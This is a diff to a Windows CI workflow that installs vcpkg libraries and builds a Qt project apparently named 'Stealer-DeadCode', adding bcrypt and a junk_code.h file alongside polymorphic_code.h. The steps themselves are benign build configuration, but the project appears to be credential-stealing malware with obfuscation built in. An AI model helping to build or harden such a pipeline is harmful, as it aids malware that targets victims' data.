@@ -86,8 +86,8 @@ jobs:
     - name: Install vcpkg and dependencies
       run: |
         # Сбрасываем VCPKG_ROOT в начале шага
-        $env:VCPKG_ROOT = ""
-        Write-Host "VCPKG_ROOT after reset: $env:VCPKG_ROOT"
+        $env:VCPKG_ROOT = "C:/vcpkg"
+        Write-Host "VCPKG_ROOT set to: $env:VCPKG_ROOT"
         if (-not (Test-Path C:/vcpkg)) {
           Write-Host "Cloning vcpkg..."
           git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
@@ -116,7 +116,7 @@ jobs:
         Write-Host "Clearing vcpkg buildtrees..."
         Remove-Item -Path "C:/vcpkg/buildtrees" -Recurse -Force -ErrorAction SilentlyContinue
         Write-Host "Installing vcpkg dependencies with triplet x64-windows-static..."
-        & $vcpkgExe install sqlite3 libzip zlib bzip2 curl --triplet x64-windows-static --clean-after-build 2>&1 | Tee-Object -FilePath "vcpkg_install.log"
+        & $vcpkgExe install sqlite3 libzip zlib bzip2 curl bcrypt --triplet x64-windows-static --clean-after-build 2>&1 | Tee-Object -FilePath "vcpkg_install.log"
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: vcpkg install failed. Check the logs for details."
           dir C:/vcpkg/installed/x64-windows-static/lib
@@ -143,8 +143,8 @@ jobs:
       run: |
         $libDir = "C:/vcpkg/installed/x64-windows-static/lib"
         $includeDir = "C:/vcpkg/installed/x64-windows-static/include"
-        $libs = @("sqlite3", "zip", "zlib", "bz2", "libcurl")
-        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "curl/curl.h")
+        $libs = @("sqlite3", "zip", "zlib", "bz2", "libcurl", "bcrypt")
+        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "curl/curl.h", "bcrypt.h")
         $missing = @()
         foreach ($lib in $libs) {
           if (-not (Test-Path "$libDir/$lib.lib")) {
@@ -224,8 +224,8 @@ jobs:
           exit 1
         }
         if (-not (Test-Path icon.ico)) {
-          Write-Host "Warning: icon.ico not found, creating a placeholder..."
-          New-Item -Path . -Name icon.ico -ItemType File -Force
+          Write-Host "Error: icon.ico not found. This may cause build issues."
+          exit 1
         }
         Write-Host "Creating build directory if it doesn't exist..."
         New-Item -Path ../build -ItemType Directory -Force
@@ -250,8 +250,10 @@ jobs:
         $env:Path = "$qtBinPath;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
         $env:INCLUDE = "C:/vcpkg/installed/x64-windows-static/include;" + $env:INCLUDE
         $env:LIB = "C:/vcpkg/installed/x64-windows-static/lib;" + $env:LIB
+        $env:VCPKG_ROOT = "C:/vcpkg"
         Write-Host "INCLUDE path: $env:INCLUDE"
         Write-Host "LIB path: $env:LIB"
+        Write-Host "VCPKG_ROOT: $env:VCPKG_ROOT"
         Write-Host "qmake path: $qmakePath"
         Write-Host "Checking if include path exists..."
         if (-not (Test-Path "C:/vcpkg/installed/x64-windows-static/include")) {
@@ -269,7 +271,8 @@ jobs:
         if (Test-Path icon.ico) {
           Write-Host "icon.ico exists."
         } else {
-          Write-Host "icon.ico not found!"
+          Write-Host "Error: icon.ico not found!"
+          exit 1
         }
         Write-Host "Running qmake..."
         & "$qmakePath" "ui/DeadCode.pro" -o "Makefile" 2>&1 | Tee-Object -FilePath "qmake_output.log"
@@ -314,6 +317,10 @@ jobs:
           Copy-Item src/polymorphic_code.h ../build/polymorphic_code.h
           Write-Host "polymorphic_code.h copied to build directory"
         }
+        if (Test-Path src/junk_code.h) {
+          Copy-Item src/junk_code.h ../build/junk_code.h
+          Write-Host "junk_code.h copied to build directory"
+        }
       shell: powershell
 
     - name: Upload build logs
@@ -335,11 +342,12 @@ jobs:
           Stealer-DeadCode/build/icon.ico
           Stealer-DeadCode/build/build_key.h
           Stealer-DeadCode/build/polymorphic_code.h
+          Stealer-DeadCode/build/junk_code.h
 
     - name: Cleanup
       if: always()
       run: |
-        Remove-Item -Path "C:/vcpkg" -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "C:/Qt" -Recurse -Force -ErrorAction SilentlyContinue
+        # Удаляем только временные файлы сборки, сохраняем vcpkg и Qt для кэширования
         Remove-Item -Path "Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "Stealer-DeadCode/release" -Recurse -Force -ErrorAction SilentlyContinue
       shell: powershell
